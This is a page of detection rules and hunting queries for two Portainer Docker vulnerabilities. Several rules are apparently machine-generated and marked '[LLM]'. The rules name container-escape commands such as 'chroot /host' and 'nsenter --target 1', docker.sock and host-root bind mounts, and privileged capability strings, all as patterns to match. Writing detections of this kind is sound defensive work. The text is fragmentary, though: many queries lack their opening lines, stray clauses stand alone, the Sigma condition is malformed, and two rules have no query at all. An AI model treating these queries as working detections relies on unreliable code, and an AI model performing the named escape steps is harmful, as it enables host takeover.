Hunts for HTTP POST traffic to the Portainer Docker Swarm service create / update endpoints that the CVE-2026-44849 advisory identifies as the bypass surface. Surfaces the specific URI paths (/services/create and /services/{id}/update) that skip EndpointSecuritySettings validation so analysts can pivot to who exercised them and from where. Rationale: Targets the two URIs the GHSA explicitly names as the bypass surface (POST /services/create with 1-of-7 checks, POST /services/{id}/update with 0-of-7 checks, plus POST /volumes/create which never had the bind-mount check). Pivots on the exact paths from the advisory so signal is bound to the vulnerable endpoints rather than generic Docker API noise. Cross-referenced with Portainer release notes (2.33.8 / 2.39.2 / 2.41.0). Cross-checked against: • https://github.com/portainer/portainer/releases • https://github.com/advisories/GHSA-5fxq-qcf3-244w

| where isnotempty(RemoteUrl)
| where RemoteUrl has_any ("/services/create", "/volumes/create")
   or RemoteUrl matches regex @"/services/[^/]+/update"
| where RemotePort in (9000, 9443, 8000, 443)
| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp), Hits = count(), AnyCmd = any(InitiatingProcessCommandLine)
          by DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl
| order by LastSeen desc

           by Computer, sSiteName, cIP, csUserName, csUserAgent
| order by LastSeen desc
title: Portainer Docker Swarm Service Create/Update API Access (CVE-2026-44849)
id: 3c5c9f9a-5f6e-4b6a-9c5a-44849aaa0001
description: Detects POST requests to Portainer Swarm service create/update or volume create endpoints that bypass EndpointSecuritySettings per CVE-2026-44849.
references:
  - https://github.com/advisories/GHSA-5fxq-qcf3-244w
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.initial_access
  - attack.t1190
  - attack.t1078
logsource:
  category: webserver
detection:
  selection_method:
    cs-method: 'POST'
  selection_uri:
    cs-uri-stem|contains:
      - '/services/create'
      - '/services/'
      - '/volumes/create'
  selection_target:
    cs-uri-stem|contains:
      - '/update'
  condition: selection_method and (selection_uri and (cs-uri-stem|contains '/create' or selection_target))
level: medium
source:(nginx OR apache OR iis) @http.method:POST (@http.url_details.path:*/services/create OR @http.url_details.path:*/services/*/update OR @http.url_details.path:*/volumes/create OR @http.url_details.path:*/Services/Create OR @http.url_details.path:*/Services/*/Update)
#event_simpleName=NetworkConnectIP4 RemotePort=/^(9000|9443|8000|443)$/

| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())

[LLM] Portainer Swarm service spec with elevated Linux capabilities or unconfined Seccomp Exploitation High
Hunts for the docker daemon on a Swarm-enabled host receiving service specs that contain the privileged values the CVE-2026-44849 advisory describes (CapabilityAdd: SYS_ADMIN/NET_ADMIN/SYS_PTRACE/ALL, Privileges.Seccomp.Mode: unconfined, AppArmor disabled). Captures the daemon-side artefact of the bypass even when proxy logs don't include request bodies. Rationale: Pulls the exact capability strings (SYS_ADMIN, NET_ADMIN, SYS_PTRACE, ALL) and modes (unconfined Seccomp, disabled AppArmor) listed in the GHSA Impact section. These values are not part of normal container spec on most fleets, so the binding to dockerd/containerd/runc plus those specific tokens keeps FP rate low. Verified against the advisory's pre-fix code excerpt showing CapabilityAdd/Sysctls/Privileges were never parsed by the partial service struct. Cross-checked against: • https://github.com/advisories/GHSA-5fxq-qcf3-244w • https://docs.docker.com/reference/cli/docker/service/create/ • https://attack.mitre.org/techniques/T1611/
ATT&CKT1611 T1610 T1068

| where ProcessCommandLine has_any ("CAP_SYS_ADMIN", "CAP_NET_ADMIN", "CAP_SYS_PTRACE", "cap_sys_admin", "cap_net_admin", "cap_sys_ptrace", "\"ALL\"", "seccomp=unconfined", "apparmor=unconfined", "AppArmorProfile=unconfined", "\"Mode\":\"unconfined\"")

          InitiatingProcessParentFileName

| where SyslogMessage has_any ("CAP_SYS_ADMIN", "CAP_NET_ADMIN", "CAP_SYS_PTRACE", "cap_sys_admin", "cap_net_admin", "cap_sys_ptrace", "seccomp=unconfined", "apparmor=unconfined", "\"unconfined\"", "\"capabilities\":[\"ALL\"]", "CapabilityAdd")

[LLM] Container escape via chroot/nsenter against mounted host filesystem Actions on Objectives High
Hunts for chroot or nsenter invocations targeting /host, /proc/1/ns, or /proc/1/root — the textbook second-stage of the CVE-2026-44849 chain where the attacker has already created/updated a Swarm service that bind-mounts the host root and now pivots into the host namespace. Targets the executable + flag combinations that distinguish escape from benign chroot use. Rationale: Bound to the specific escape pattern the GHSA describes: 'access the host filesystem from the running container (e.g. via chroot /host)'. Pairs the LOLBin (chroot/nsenter) with the namespace-target tokens so it doesn't match administrative chroot use, and excludes systemd/snapd parents that legitimately invoke chroot during host operations. The advisory text 'chroot /host' is used verbatim as one of the high-signal matches. Cross-checked against: • https://github.com/advisories/GHSA-5fxq-qcf3-244w • https://attack.mitre.org/techniques/T1611/ • https://gtfobins.github.io/gtfobins/chroot/
ATT&CKT1611 T1059.004

DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("chroot", "nsenter")
| where ProcessCommandLine has_any ("/host", "/proc/1/ns", "/proc/1/root", "--target 1", "--target=1", "-t 1")
| where InitiatingProcessFileName !in~ ("init", "systemd", "snapd", "snap-confine", "docker-init", "tini")
| where AccountName != "root" or InitiatingProcessParentFileName in~ ("containerd-shim", "containerd-shim-runc-v2", "runc", "crun", "dockerd")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, InitiatingProcessParentCreationTime
| order by Timestamp desc
Syslog

| where Facility in ("auth", "authpriv", "daemon", "user")
| where SyslogMessage has_any ("chroot /host", "chroot=/host", "nsenter --target 1", "nsenter -t 1", "--mount=/proc/1/ns/mnt", "/proc/1/root", "chroot /proc/1/root")
| project TimeGenerated, Computer, HostName, ProcessName, ProcessID, SyslogMessage, SeverityLevel, HostIP
| order by TimeGenerated desc

[LLM] Container start with docker.sock or sensitive host-path bind mount Exploitation High
Hunts for container processes whose runtime spec includes a bind mount of /var/run/docker.sock, /, /root/.ssh, or the Portainer data directory — the post-bypass artefacts of CVE-2026-44849 where a non-admin user has slipped an unrestricted bind mount past the missing AllowBindMountsForRegularUsers check. The docker.sock variant is particularly high-signal because it directly enables sibling-container escape. Rationale: Pulls the exact sensitive paths the advisory enumerates ('bind mounts of any host path, including /, /var/run/docker.sock, SSH keys, or Portainer's own database'). Each of those paths is named verbatim in the Impact section, making the match high-fidelity. docker.sock + a container is sufficient on its own to grant container-breakout primitives, so this also fires as a leading indicator even without confirmed exploitation of CVE-2026-44849. Cross-checked against: • https://github.com/advisories/GHSA-5fxq-qcf3-244w • https://attack.mitre.org/techniques/T1611/
ATT&CKT1611 T1613 T1525

   or FileName in~ ("runc", "crun", "containerd-shim", "containerd-shim-runc-v2")
| where ProcessCommandLine has_any ("/var/run/docker.sock", "docker.sock", "-v /:", "--volume=/:", "source=/ ", "source=/,", "source=/var/run/docker.sock", "/root/.ssh", "/data/portainer", "/host/etc", "\"Source\":\"/\"")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName
| order by Timestamp desc

| project TimeGenerated, Computer, HostName, ProcessName, SyslogMessage, HostIP
| order by TimeGenerated desc

[LLM] Docker local-driver volume created with type=none and o=bind (CVE-2026-44849 volume variant) Exploitation High
Hunts for the volume-driver-bind bypass variant the advisory calls out separately: a Type:volume mount whose VolumeOptions.DriverConfig.Options declares the local driver with type=none and o=bind, or a direct POST /volumes/create with the same payload. Either path materialises a bind-equivalent mount that the partial Mounts struct check never inspected on any Portainer branch. Rationale: Targets the volume-driver-bind variant called out in its own paragraph of the advisory: 'A mount with Type:"volume" and VolumeOptions.DriverConfig.Options: {type:"none", o:"bind", device:"<host path>"} is forwarded to the Docker daemon unchanged'. The triple type=none + o=bind + device= is the canonical local-driver bind incantation; legitimate use of this combination is extremely rare outside of explicit infrastructure-as-code volume declarations on the same host. Also unions in POST /volumes/create on the proxy log because the advisory notes that endpoint never had the AllowBindMountsForRegularUsers check on any branch. Cross-checked against: • https://github.com/advisories/GHSA-5fxq-qcf3-244w • https://docs.docker.com/reference/cli/docker/volume/create/ • https://docs.docker.com/storage/volumes/
ATT&CKT1611 T1078.003
Data sourcesEndpoint.Processes Web
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("dockerd", "docker", "containerd") or FileName in~ ("docker", "dockerd")
| where (ProcessCommandLine has "type=none" and ProcessCommandLine has "o=bind" and ProcessCommandLine has "device=")
     or (ProcessCommandLine has "volume create" and ProcessCommandLine has "--driver local" and ProcessCommandLine has_any ("-o type=none", "--opt type=none"))
     or (ProcessCommandLine has "VolumeOptions" and ProcessCommandLine has "DriverConfig")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
let DockerActivity = Syslog
    | where TimeGenerated > ago(7d)
    | where ProcessName in~ ("dockerd", "containerd", "docker")
    | where (SyslogMessage has "type=none" and SyslogMessage has "o=bind")
         or (SyslogMessage has "\"type\":\"none\"" and SyslogMessage has "\"o\":\"bind\"")
         or (SyslogMessage has "DriverConfig" and SyslogMessage has "\"local\"" and SyslogMessage has "device");
let WebActivity = W3CIISLog
    | where TimeGenerated > ago(7d)
    | where csMethod =~ "POST"
    | where csUriStem has "/volumes/create" or csUriStem matches regex @"/services/[^/]+/(create|update)"
    | project TimeGenerated, Computer, cIP, csUserName, csUriStem, csMethod;
union isfuzzy=true DockerActivity, WebActivity
| order by TimeGenerated desc

[LLM] Portainer plugin management API access (CVE-2026-44848) Exploitation High
Hunts HTTP POST requests to Portainer's /docker/plugins/pull and /docker/plugins/{name}/enable proxy endpoints, which bypass Portainer-side RBAC in vulnerable releases (<2.33.8, <2.39.2, <2.41.0) because /plugins is absent from prefixProxyFuncMap and falls through to executeDockerRequest unauthorized. Rationale: Article identifies the exact vulnerable endpoints (POST /plugins/pull, POST /plugins/{name}/enable) and shows in the Go source excerpt that /plugins is NOT in prefixProxyFuncMap so it bypasses Portainer's authorization wrapper. A successful POST against this URI from a non-admin session is unambiguous exploitation. Cross-checked against: • https://github.com/advisories/GHSA-rrmm-9v76-h3p4
ATT&CKT1190 T1068

[LLM] Docker plugin runtime spawned from /var/lib/docker/plugins/ on host (CVE-2026-44848) Installation High
Hunts Linux process executions whose binary path begins with /var/lib/docker/plugins/<digest>/rootfs/ and whose parent is dockerd/containerd/runc. Any post-exploit plugin pushed through the unauthorized /plugins/pull + /plugins/{name}/enable chain lands here and executes as root with whatever capabilities (CAP_SYS_ADMIN, host bind mounts) the plugin manifest requested. Rationale: Article states 'Docker plugins execute as root on the host' and the Linux runtime path for an enabled plugin is /var/lib/docker/plugins/<digest>/rootfs/. Pairing that image-path prefix with a containerd/dockerd parent yields a near-zero-FP signal because plugin install is normally an admin-only, low-frequency event. Cross-checked against: • https://github.com/advisories/GHSA-rrmm-9v76-h3p4 • https://docs.docker.com/engine/extend/plugin_api/
